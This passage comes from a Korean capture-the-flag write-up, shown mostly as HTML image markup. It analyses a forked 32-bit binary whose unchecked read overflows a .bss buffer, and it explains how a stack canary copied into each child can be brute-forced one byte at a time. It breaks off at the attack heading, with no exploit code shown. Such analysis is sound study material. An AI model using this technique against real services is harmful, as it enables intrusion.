url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsTAAALEwEAmpwYAAABuUlEQVQoz12S6W7bMBCE9f5Pll9BnLhoncSt7NhSdVASKYmHeHwFVcAousAAxGI4O3sUZSmpa8kwaKbJotSGUpFlCWgdcC7SdZbLRdI0kq6bEUKjlGee//KMCVgb91xRVQu328gwOLrOYYzHe4iRR2Ty9SqpqgkhLF3n99z/PO8jRdMo2kbQdStC5IqwrqAUaJ32D1pH6nqibXradqLvA1JmZzDPIGXCOTAmUojeMYyaXjia1jGOnr7PThPWQgjsrbdt5hnU7KgqS9N4hHAMw7aLZeTCRXUP1K3l7XPgeFroe4s2DkiPVrLg1zXSiJVzJTiXK3KCZXE45x+8bcuCled0ijy/WI7fZ7re4lxC640Y00PwevV8fEa+/Zi512JfXm5RKfsQzQssbreN+91TVpJLLWk7wyAs6+ozYVdc15AuFx/r3z6U9RibQcZe2Cili0q5aEyIKaXoXIzFOOZ5BM5nuH3l4eZTcfwTKTuta01VBX79ZEfbaoxxhJDYNkgp4X2ieHoaeH6WvL4uvL0pPj5W3t9XTqclI+X38Tibslxe29a9CBEO47gd1jUcjIkHrcMOY8JhmvzhD4ZSsIlwhiWSAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./7.png\"\n        title=\"./7.png\"\n        src=\"/static/e7359106c06c98ffe43174a04ec4a34f/37523/7.png\"\n        srcset=\"/static/e7359106c06c98ffe43174a04ec4a34f/e9ff0/7.png 180w,\n/static/e7359106c06c98ffe43174a04ec4a34f/f21e7/7.png 360w,\n/static/e7359106c06c98ffe43174a04ec4a34f/37523/7.png 720w,\n/static/e7359106c06c98ffe43174a04ec4a34f/f1d1f/7.png 739w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span>\nsub_804F700 함수</p>\n<ul>\n<li>v3, v4의 변수들은 <code class=\"language-text\">.bss</code> 섹션에 존재하는 것을 확인할 수 있으며 서로 <code class=\"language-text\">0x20</code> 차이가 난다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 32.22222222222222%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAAsTAAALEwEAmpwYAAABN0lEQVQY0z3NS1KDMAAAUI7cVZk63bQzduNlXOgF3Lhx0BJCCyYBgkD4BWjSBFpLHF14gDfP8t6Sg4OLqCuTsSvUVYxDKQmseD7UaS0r8fT4fLda73YPm839druz7fVyubbt1WKxtY4v2SfoGBYRnGQ1mmm69KrAdZd1PRNzKxiJIxqHwfF0GqZp1FpRmmgtGTtb4StAH+88YSLX11YaqTQbYpCrsmuTryYgGB4xIUEQNE3T9wPnPAzDtq0wri2EUoyQEMIYM99uxphRX9J0kEKVjBWMIYQOh4Pv+xBCz/OyLOu6vmkqQhorTcs8z5RSv3iejTHT9F2WUqmRc962LSHEdd39fu+6LoQwjmPOOaURQtXfjJGU8h9rfU3TQYgzY6woCowxAMBxHACA7/uU0r4fsoxiXP0AfIE7oPwYIaAAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./8.png\"\n        title=\"./8.png\"\n        src=\"/static/5131db72b51927f1af07b2eda0f092da/37523/8.png\"\n        srcset=\"/static/5131db72b51927f1af07b2eda0f092da/e9ff0/8.png 180w,\n/static/5131db72b51927f1af07b2eda0f092da/f21e7/8.png 360w,\n/static/5131db72b51927f1af07b2eda0f092da/37523/8.png 720w,\n/static/5131db72b51927f1af07b2eda0f092da/f941f/8.png 736w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>차이</p>\n<ul>\n<li>해당 v4 변수를 canary로 명칭한 이유는 <code class=\"language-text\">gs:0x14</code> 주소의 카나리 값을 스택 버퍼와 스택 프레임 포인터 사이에 랜덤한 값을 삽입한 후 함수 종료 지점에서 랜덤 값 변조 여부를 검사하는 것을 확인할 수 있기 때문이다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 44.99999999999999%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB40lEQVQozy2R2W7bMBBF9f+/1Jc+NG3QNE7l7HbiWLtpaqVkUhJFnUJyCVxwMDgzmLnjHY8NWdZQlpq67lFqRClH101oPTEMDil7gqBBiAYpW4pCo5Slba+cMRN979acl6YdcVRRFj1SDhhtsRbcNAOLWOEwaEiTimLlRnozYUdw7sosz1qHJ2SHyCtkacirmVZDZ0BdQA/guP6pUIi85FwoZOmo2xkzsvKNgmEAYxxevk2ptyGln5BvEuptSvE3xuxO9HuBPQj6XYbcRCvXvSac7iLO98laUz1EDGpkGEFrh5fuOsSh5sVPedvklMeKXtbXEdsLdBpzbolfOmRY8LVLOL4UqOSCFjVj3ix7ryuP49LwDG8HuH+eeNobZG0ZZtB2xv33RlsIUtgf4flDk8iaRs8YC8pMDNPVx+WAXrzvSHYtwYcgPAhkUFNGNVq2DNVlXgy9yG4OX1uXfbZT8Jm5cyxcETVOZcqpU+P6vHNzP7phnJ1XP8YUviD8WXL6I7FfAvuVQpZDmkNezHMoOT/EiI0g+lUQ3ebk25j+kOGinPFDMIsKO4N3+y3h4XvK4w/B003G7u686v23WDQv8fPNyQQP2Va+53+LfeVXn4V/CUvfxJV/iStfB4WvZefXavL/AQSOplOaUVvMAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./9.png\"\n        title=\"./9.png\"\n        src=\"/static/1557e68d838e34bd4d6a6448ba5a836f/37523/9.png\"\n        srcset=\"/static/1557e68d838e34bd4d6a6448ba5a836f/e9ff0/9.png 180w,\n/static/1557e68d838e34bd4d6a6448ba5a836f/f21e7/9.png 360w,\n/static/1557e68d838e34bd4d6a6448ba5a836f/37523/9.png 720w,\n/static/1557e68d838e34bd4d6a6448ba5a836f/f1d1f/9.png 739w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>카나리 체크 함수</p>\n<h2 id=\"sub_8048e42-read_byte-함수-분석\" style=\"position:relative;\"><a href=\"#sub_8048e42-read_byte-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\" aria-label=\"sub_8048e42 read_byte 함수 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>sub_8048E42 [read_byte] 함수 분석</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 562px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 48.888888888888886%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAAsTAAALEwEAmpwYAAABJklEQVQoz5WQXW7CMBCEfbyeoAfsfSohQCCaSpQfhzhrJ3ackDj27laBFvWBVnQ0D6PRzsN+YvP2JE+b7bbOMrle77P30/YDAM7WpdpGa2N9sf32zyyapmRmIiRKRMiMiImI+AGJPD9l2etiUSyXZdclgPN6DXnuj7IxBp3jqmKtuSy5rtm5KRgzldPYVC/GPCtVAHQASeuoFBpDANS2BDAtq4rblokYkVP6CtO47wNzYOaUKEa+vMAh0DhiCBgjXXq8+4eoKjQm9f2oNa9WVBSYZTSbhf2+ltIDxKYZjkeHeGctyrJTymuNAGiM17q3drgBu4bf8IlhSFLifB6V6g+Hxvtwuybiv6mLouh2u0pK631yLuIVxWMSWgciHkcKYSI0DP/wJwI5QP42bNMnAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./10.png\"\n        title=\"./10.png\"\n        src=\"/static/7ca367a7e3dae4bb6313744d840d7e1b/6e88f/10.png\"\n        srcset=\"/static/7ca367a7e3dae4bb6313744d840d7e1b/e9ff0/10.png 180w,\n/static/7ca367a7e3dae4bb6313744d840d7e1b/f21e7/10.png 360w,\n/static/7ca367a7e3dae4bb6313744d840d7e1b/6e88f/10.png 562w\"\n        sizes=\"(max-width: 562px) 100vw, 562px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>sub_8048E42 함수</p>\n<ul>\n<li>지역 변수 <code class=\"language-text\">v1</code> 에 1 바이트씩 <code class=\"language-text\">read</code> 함수를 바탕으로 입력을 받는 것을 확인할 수 있다.</li>\n<li><code class=\"language-text\">v2</code> 변수는 read 함수의 파일의 사이즈 이며 결국 1을 반환하겠지만 만약 실패할시 프로세스를 종료하는 것을 확인할 수 있다.</li>\n<li>해당 함수의 반환 값은 사용자의 1 바이트 입력한 값이다.</li>\n</ul>\n<h2 id=\"sub_8048e7e-next_read-함수-분석\" style=\"position:relative;\"><a href=\"#sub_8048e7e-next_read-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\" aria-label=\"sub_8048e7e next_read 함수 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>sub_8048E7E [next_read] 함수 분석</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 475px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 99.44444444444443%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAIAAAAC64paAAAACXBIWXMAAAsTAAALEwEAmpwYAAACGElEQVQ4y5VSbW7bMAz1AfZ/l9gZttP0FLvcMKD7UWAb0KBJliZp7MZKbEuW5I/I+iA5KG7Tbc2G7IEQCIEUH99T8uXmQ8o+rTL8PkkX63q+5LNl9W2Sfb19mMza6Y+P89XV7N4+PE6ni/fz1fX0vtkWJi9tXtrkMZsQrSAYIiQCIoTgEf0xJ6KSaHdMLFFKNJY9ISnLpVLvmuZGiKEoSikHpUkpqmtCJMDjCTE5AfEpEl5N0s3b3f463zrOg1LIOXFOjFHTUFWhEDDePHN5QSLErZRvtP5cFAPnoDVVVYw8j/OLIuZlOTb/iaQWad9fHQ4zpVzToDEkZeSsFPV9TKSMFIbhXLOUPqphKQQEQGMQEV/XnbuLtJ0QUFUgRFDK13UIAU7VJ23OIhHCG0NtO2RZ7xzQ/yApS5tl7WIhtltlLbWtDwFGe0b+p+GvWSSMHRjTShlrg3PkXAC4dH7cOYSok3PBGNpsorZFQYuFY0wfN/JdB10Hw0BVNXj/8nSidRiGsNmoprG7HW23w3rdp6kRInSd9Z6sBefQWvCe+t79ymu0Cjn38znt9zbPlVIGAP6m8G+0lYo+S4mMHTgPdW1DeNHp327HZgDiHIVArX3bhrr2F2qW1LUDwK6jrrNShqaJW+AlpEeftTbew/F7knPkPb729mwkZTkwptfrum1t20aftPaXTr6708ag1vFjax1DKS/lRfETwPiEG5owcBkAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./11.png\"\n        title=\"./11.png\"\n        src=\"/static/e0aeb0e45220599df0c1ea09acbb1147/466da/11.png\"\n        srcset=\"/static/e0aeb0e45220599df0c1ea09acbb1147/e9ff0/11.png 180w,\n/static/e0aeb0e45220599df0c1ea09acbb1147/f21e7/11.png 360w,\n/static/e0aeb0e45220599df0c1ea09acbb1147/466da/11.png 475w\"\n        sizes=\"(max-width: 475px) 100vw, 475px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>sub_8048E7E 함수</p>\n<ul>\n<li><code class=\"language-text\">read_byte</code> 함수의 반환 값을 a2 인자로 받고, a1의 인자는 전역 변수 v3를 받는다.</li>\n<li>read 함수를 바탕으로 전역 변수 v3의 버퍼 공간을 사용자의 입력값 즉 바이트를 길이 값으로 매개체 삼아 버퍼 공간을 채우는 사실을 알 수 있다.</li>\n<li>전역 v3의 버퍼 공간 32바이트를 넘어서는 값의 길이 검증이 없기 때문에 255 바이트까지 입력을 받을 수 있어  충분히 오버플로우가 가능한 것으로 보이지만 문제는 SSP 보호 기법으로 인해 일반적인 오버플로우가 불가능하다.</li>\n</ul>\n<h2 id=\"canary-분석\" style=\"position:relative;\"><a href=\"#canary-%EB%B6%84%EC%84%9D\" aria-label=\"canary 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>canary 분석</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 46.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsTAAALEwEAmpwYAAACIklEQVQoz02QSW/TUBhF8z9okzSTp2c79vOYeIznxCGtU0orhAoVG8T/X/H6XYQXiMXRle7i6uhOEr/CqXuAvysQJQ1Ma4f5QsN8ocBwWuRphzZNYfADZN2FpsdQ9QjMzcHcCncyx1yyMJNszCUbkzw54nn4DM/00BUdzvUZOx6Sw2zwoKZmd6RKKsizXVJ1RrMNo5vlmj4sVLrZMJrK+tjNVgpNlxuaePsKx8sAZnlIy3aEBzGY5RAPapR1A9cxoDENnCkwTQWapUCxGSTThsYsyMzEWlMx26iY+HGNj9cnGLaPKK9QHy+I85okZsBwmvc4jkWbaIIHnpDDWOhpJ6ykFFYYC7bNhCw5Yi1bYqFuxUzxxH+GLtKyQ9H22GcVGY4Pa5u9Z7vut2EfRFIOYusWYqn4IszOQtJjwdxC+Fkv7mRXOPtOGE4qJn5Uo394hGpyJEWL+nRBEOVYqwZ5UTvaa6aF0/2A+tRDNS18+fYG7geI8wLPX1+hqDp+/fiJ748vGAcv1yeYPEBWHVG2PaKsItvbwQ0b6u8fSTFsOl6u1PQXktiWXl7fyAkj4kFE7fmBVrJOp/NAaVbSJI1aXO8/gW89lIcWl/6KNDrAtTx4PEeZlgjjHM15GO8weIAgPkDSTEyXEmYreczbpYTpSsIkjTsMwxNcZ4cwSGBbHjYrFauFDM85oEgrqG6N1TaBE0Q4ND1Uw8btYvNv7G+OLGX8AfRdKnS5QDrtAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./12.png\"\n        title=\"./12.png\"\n        src=\"/static/d409dfd5dfc9ee807ee2c314a9b22ce1/37523/12.png\"\n        srcset=\"/static/d409dfd5dfc9ee807ee2c314a9b22ce1/e9ff0/12.png 180w,\n/static/d409dfd5dfc9ee807ee2c314a9b22ce1/f21e7/12.png 360w,\n/static/d409dfd5dfc9ee807ee2c314a9b22ce1/37523/12.png 720w,\n/static/d409dfd5dfc9ee807ee2c314a9b22ce1/302a4/12.png 1080w,\n/static/d409dfd5dfc9ee807ee2c314a9b22ce1/76a99/12.png 1117w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>카나리</p>\n<ul>\n<li>gdb를 바탕으로 카나리를  <code class=\"language-text\">gs:0x14</code>  가져와 스택상에 넣는 과정을 확인할 수 있다.</li>\n<li>중요한 사실은 32bit 카나리인 경우 값이 총 4바이트이며 상위 1 바이트가 무조건 널 바이트인 것을 확인할 수 있다.</li>\n<li>전역 변수 <code class=\"language-text\">v3</code> 과 카나리의 값은 각각 .bss 영역에 있고 32바이트 차이가 나기 떄문에 오버플로우를 발생시켜 카나리의 값을 임의로 변조시켜 brute-force를 통해 한 바이트씩 카나리의 값을 총 3 바이트를 알아낼 수 있다.</li>\n</ul>\n<h2 id=\"fork-분석\" style=\"position:relative;\"><a href=\"#fork-%EB%B6%84%EC%84%9D\" aria-label=\"fork 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>fork 분석</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 67.77777777777777%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAIAAACgpqunAAAACXBIWXMAAAsTAAALEwEAmpwYAAABwklEQVQoz2VRWZIaMQzt+58q3znBFJOhgF7ovb3KtiRbUw2ECUSl8s8r+W3VONq6XvpeG0PWsnNs7WNPJ9N1epq8MaT1O2otV+fz2vdwvcI8s9YSoxBJKSIiyxJOp7VpdNf5Zc53NGd5TnW5LF0HTQPDkIaBlBJjBEBikr6H49fYtn5eZVllmmXbHvel7FsBECLnXFJixJxzeX6sDbvICTOvLo06mfgPeGO2FrXmbeNtiyEQ0Q2/PWvn9EcPx87+/px/fYTTQDv080EFwPNchkGMyfI6Zomu1arRy9mE0e5OXqcyho9HOtd0XbcVVhWVSSbEXQIEVqacW+yNVqQ0GptMCEz0oKm8J6UIoCDmGJk536Tt2qxl75JW5J1gKiFQSvxE78c8DLntogvRQUhIP7L3enma03WyDu6JvFirtC5/PqVukvI65YDET8x72lYZJu/RYsb8lvUtMAohA9zqKiWX/FSlNXqPMWYPKZe81/hfVXI4yPmSRj05dDY6RH4yr6u0o97C4pJ10b+RV11XPg9y6YyKyiPw3nP565nrJn/Vtp02SLG8q95li7UCQLlwkcKciR6ZbRumVBAlJS67mXfP39TEK3pmCYcaAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./13.png\"\n        title=\"./13.png\"\n        src=\"/static/4673a9941ac072aa90d2fbdbdbb47ef4/37523/13.png\"\n        srcset=\"/static/4673a9941ac072aa90d2fbdbdbb47ef4/e9ff0/13.png 180w,\n/static/4673a9941ac072aa90d2fbdbdbb47ef4/f21e7/13.png 360w,\n/static/4673a9941ac072aa90d2fbdbdbb47ef4/37523/13.png 720w,\n/static/4673a9941ac072aa90d2fbdbdbb47ef4/f1d1f/13.png 739w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>frok 분석</p>\n<ul>\n<li>문제는 총 반복을 <code class=\"language-text\">0x31F</code> 를 반복하면서 <code class=\"language-text\">fork</code> 함수를 바탕으로 자식 프로세스를 생성하고 내부 로직이 끝나면 죽이고 생성하는 과정을 반복한다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 78.88888888888889%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAAsTAAALEwEAmpwYAAAEwklEQVQ4y0WTWVCTVxTHjwmtxajgjAuWdlAr0gcMfh8gNWwuRadqsZuFIqi1D860D+3UgttUrKTtCCKLyCokgYRAEAiERQgkKAMkkKWEEHaJKAiiAqJC+JKczhe7PNw59+X+5nfP+R8gvb3AD2BV0Lq1nFAWy5uzehUZunLl9hCX1SQB4Ewsfwv83lkOBMcPiJ07YPvuXRDgy4aPAVYGu60P4axfGxTi5PRh6BpX3wMAa8DXfYMbO50b5F6QnOFelH51iygj5V1B6jV33vVUsjRnKyHOAm9R5jIHMIAAn9271gZu3ezmWZJ1fAM/Jc2jKP26hzjz6saC5BubhDd+hO0ALqQkLyGxV4N8kx6T2hVY1N+NXIMKvcrzT3iW50NQbTGTBpLubrD/YJgLuLzt9nmztE8w3IsZ2jZM7byHwiEjnu6QPweflCvAruKfqX90Hx89m15Q9uiXHs88Xyg3D6JHafaxjeKbEFzJZ/qGBiwjjx5mAABg219w/G6tanR+FnUjQ4vqwT7LxPwcXtK3jUCUWg5hdyRx6icTuGCzUqYXM/Ylu41qeTyGvtWF0X41IjjxSMvwIdjgs80TENFxznQqu+Ysi/hw4aXV/Gre9tpKYVaf3gzft8vhSFNF3NjLOUREapFastN1YPYZBsqEMaGCVNi5e+/qHf5EyA5/IiAp6uRyGpigb9fQD9But1ptVht9rTAPmuGoogr23SmNU/1jaJx77jBUTjxAoqow6lzbNysOl/1K7uOe2rc3/uQnX1VcOgAAzJ/Vys5ZyyKOvX5pHX31wvaaojCTNmRL+cCu5MXRPeubmqCUA7324adPKOGICTdJcqKhqAQOK9JYCYjMy4jMOF3eCtrwWEtNV8/MNHbcH7K2DvXZhmaf4XnNPTP4VxcCKRXEFQ73Yqt5mOK3t9jpmjdowK1ludGeZVnAEiGcoG5DPKoBzr3pY6Syuqt1ahylBq1VqLpnU02N4y+dLWbwrxcDKeXHSkYHUDc+RpWoWu3G6UmKjsQHZbnRHpIc2FMnZIZXx0NwfTYNW/avoebpJDaYDNYag9ZmeDr1xtA3NxmIKkFsyWg/dk+OWyp0apvxyWMLf9j4HzC0TuzIIXEtHhyxmUeIapF10kDFoGmprkdPGWem8WxXyyi8D8Agy/MvJBm7sHigBxNb5SgZNuHv3XSwb8V43s77P9gAEP7ZIRYAOH/RXNlN9zlb14FpqrtI//B0W8MkkNs2b/ROS9rEEmZGOglSI1dJciIZvJRIJ15KBFtW6UrKJOBVUeTYZZLjB+w9HJdAzy3r3ivl7XTipcY4i25GsEqyIyD/WjSrMGMPcBKiYL/sbMB+WWxxhPxKwXfKRF5kU0LBKWWi6NPqi8ShqvMQLrvo2OWPvg4DVwAI5h6DsKrYnw7WnhMfb/4zP6b5j4KoZm7Rt4qryZA9IoczbbcuFGhqUaxtRJGmAQUdNSjUNeJ5teCHNKMMbhpkTCLQH47q0sCgVDPooXBVxf0iXSMWaxtRoKrFUo0cs7TVCILBZriiKT4p0TehVKewVOoVVJm60SLWNSJXV/Jlbv8dyDc1MMJrLsOR2t/ggfkBY/LhOGRopfVSnRKleuViubZpqaKrCW9payb+BimOzqLFV1s1AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./14.png\"\n        title=\"./14.png\"\n        src=\"/static/0984e284d6785593f7350f4e9f279057/37523/14.png\"\n        srcset=\"/static/0984e284d6785593f7350f4e9f279057/e9ff0/14.png 180w,\n/static/0984e284d6785593f7350f4e9f279057/f21e7/14.png 360w,\n/static/0984e284d6785593f7350f4e9f279057/37523/14.png 720w,\n/static/0984e284d6785593f7350f4e9f279057/6c745/14.png 893w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>fork 과정</p>\n<ul>\n<li>fork 함수를 바탕으로 부모 프로세스의 메모리 사이즈, 값을 그대로 복제하여 자식 프로세스를 생성한다.</li>\n<li>부모 프로세스가 수행하던 코드 영역까지 그대로 복사를 하며 호출 이후에 부모 영역, 자식 영역이 따로 생기는 것을 알 수 있으며 canary의 값 또한 그대로 복제가 되는 것을 확인할 수 있겠다.</li>\n<li>그렇다면은 반복을 돌면서 자식 프로세스가 생겨나도 brute-force 기법을 바탕으로 1 바이트씩 해당 카나리 값을 구할 수 있겠다.</li>\n</ul>\n<h1 id=\"해결-방안\" style=\"position:relative;\"><a href=\"#%ED%95%B4%EA%B2%B0-%EB%B0%A9%EC%95%88\" aria-label=\"해결 방안 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>해결 방안</h1>\n<h2 id=\"공격\" style=\"position:relative;\"><a href=\"#%EA%B3%B5%EA%B2%A9\" aria-label=\"공격 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>공격</h2>\n<h2 